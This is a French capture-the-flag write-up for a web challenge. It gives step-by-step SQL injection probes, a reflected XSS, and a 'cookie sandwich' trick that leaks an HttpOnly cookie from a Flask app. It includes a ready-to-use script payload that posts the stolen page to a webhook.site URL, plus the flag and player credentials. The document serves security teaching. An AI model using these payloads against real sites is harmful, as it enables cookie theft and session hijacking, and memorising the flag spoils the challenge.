# Entremet Secret — CTF Jörmungand

**Catégorie** : Web | **Difficulté** : Hard  
**Flag** : `HackUTT{M4g1Cal_c00Ki3_57eaLing}`  
**Identifiants joueur** : `Emilien` / `Croissant123!`

---

## Scénario

> *Wagon 9 — Depuis que les rebelles ont pris le contrôle du train, il ne reste plus grand-chose pour garder le moral… Heureusement, l'application du wagon-restaurant fonctionne toujours. Je suis persuadé qu'on m'avait parlé d'une recette bien gardée, mais je ne sais plus où elle est cachée...*

---

## Vue d'ensemble des vulnérabilités

```
[ Joueur ]                    [ Serveur :5000 ]           [ Bot admin ]
    |                                |                          |
    | login Emilien                  |                          |
    |------------------------------> |                          |
    | <-- order_id (non-HttpOnly)    |                          |
    |     réfléchi dans /dashboard   |                          |
    |                                |                          |
    | Rabbit hole : SQLi /recipes    |                          |
    | (rien d'utile dans la DB)      |                          |
    |                                |                          |
    | Découverte : ?note= réfléchi   |                          |
    | sans échappement (|safe)       |                          |
    | → XSS via URL                  |                          |
    |                                |                          |
    | POST /signal?url=...XSS...     |                          |
    |------------------------------> | --- visite URL --------> |
    |                                |   (bot authentifié       |
    |                                |    + secret_recipe       |
    |                                |    HttpOnly = FLAG)      |
    |                                |                          |
    |                                |   XSS s'exécute :        |
    |                                |   1. supprime order_id   |
    |                                |   2. pose sandwich       |
    |                                |      order_id="pwn       |
    |                                |      dummy=end"          |
    |                                |   3. fetch /dashboard    |
    |                                | <-- order_id reflété --> |
    |                                |    contient secret_recipe|
    |                                |   4. btoa(html) → exfil  |
    | <-- réception webhook ---------|--------------------------|
    | décode base64 → trouve flag    |
```

---

## Solution pas à pas

### Étape 1 — Reconnaisance

Se connecter avec `Emilien / Croissant123!` et explorer l'application.

**Observer dans les DevTools (onglet Application → Cookies) :**
```
order_id      = a3f8c21d...   (HttpOnly: NON  ← intéressant)
secret_recipe = ???           (HttpOnly: OUI  ← inaccessible via JS)
```

Le `N° de suivi` (order_id) est affiché en haut de la page `/dashboard`.
→ Si on contrôle la valeur de `order_id`, elle apparaît dans le HTML.

### Étape 2 — Rabbit hole SQLi

La page `/recipes?q=` est vulnérable à une injection union-based :
```
/recipes?q=' UNION SELECT 1,'test',3,4--
/recipes?q=' UNION SELECT name,sql,3,4 FROM sqlite_master--
```
La base ne contient que des recettes de pâtisserie. **Rien d'utile pour le flag.**

### Étape 3 — Trouver la surface XSS

Inspecter le source HTML de `/dashboard` révèle un commentaire :
```html
<!-- TODO: supprimer le paramètre ?note= utilisé pour les tests de notification -->
```

Tester :
```
http://localhost:5002/dashboard?note=<b>test</b>
```
→ Le `<b>test</b>` s'affiche en gras dans la page. **XSS confirmé.**

### Étape 4 — Comprendre le bot

La page `/signal` permet de soumettre une URL.
Un bot admin la visite avec un cookie `secret_recipe` HttpOnly contenant le flag.
L'URL soumise doit être sur `localhost:5002` (même domaine) pour que les cookies
du bot soient envoyés avec la requête.

### Étape 5 — Comprendre la technique Cookie Sandwich

Flask/Werkzeug reconnaît les valeurs de cookies entre guillemets (RFC2109).
Si `order_id` commence par `"`, Werkzeug lit jusqu'au prochain `"` en englobant
tous les cookies intermédiaires dans la valeur.

**Exemple :**
```
Cookie envoyé :   order_id="pwn; secret_recipe=FLAG; dummy=end"
                  ─────────────────────────────────────────────
Werkzeug parse :  order_id = pwn; secret_recipe=FLAG; dummy=end
```

Flask réfléchit ensuite cet `order_id` dans `/dashboard` → le flag apparaît dans la page.
Les `;` sont encodés en octal `\073` par Werkzeug.

### Étape 6 — Construire le payload XSS

Le payload doit s'exécuter dans le navigateur du **bot** (même domaine, mêmes cookies).

```javascript
(async()=>{document.cookie='order_id=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';document.cookie='order_id=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/dashboard';document.cookie='dummy=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';document.cookie='order_id="pwn;path=/dashboard';document.cookie='dummy=end";path=/';const r=await fetch('/dashboard',{credentials:'include'});const t=await r.text();fetch('https://webhook.site/be768538-9185-4ae9-9780-300f8edec593',{method:'POST',mode:'no-cors',body:btoa(unescape(encodeURIComponent(t)))});})();

```

### Étape 7 — Encoder et soumettre

Encoder le payload pour l'URL (remplacer les caractères spéciaux) :

```
http://localhost:5002/dashboard?note=<script>PAYLOAD</script>
```

Version prête à l'emploi — coller directement dans le champ `/signal` :

```
http://localhost:5002/dashboard?note=<script>(async()=>{document.cookie='order_id=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';document.cookie='order_id=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/dashboard';document.cookie='dummy=x;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';document.cookie='order_id="pwn;path=/dashboard';document.cookie='dummy=end";path=/';const r=await fetch('/dashboard',{credentials:'include'});const t=await r.text();fetch('https://webhook.site/be768538-9185-4ae9-9780-300f8edec593',{method:'POST',mode:'no-cors',body:btoa(unescape(encodeURIComponent(t)))});})();</script>
```

### Étape 8 — Lire le résultat sur webhook.site

Après ~5 secondes, une requête arrive sur webhook.site avec le paramètre `?d=`.

**Décoder le base64 :**
```bash
echo "LE_BASE64_ICI" | base64 -d > response.html
grep "order-id-value" response.html
```

**Résultat dans le HTML :**
```
N° de suivi : pwn\073 secret_recipe=HackUTT{M4g1Cal_c00Ki3_57eaLing}\073 dummy=end
```

`\073` = encodage octal de `;` par Werkzeug.

**Flag : `HackUTT{M4g1Cal_c00Ki3_57eaLing}`**

---

## Déploiement

```bash
docker compose up --build -d
# → http://localhost:5002
```

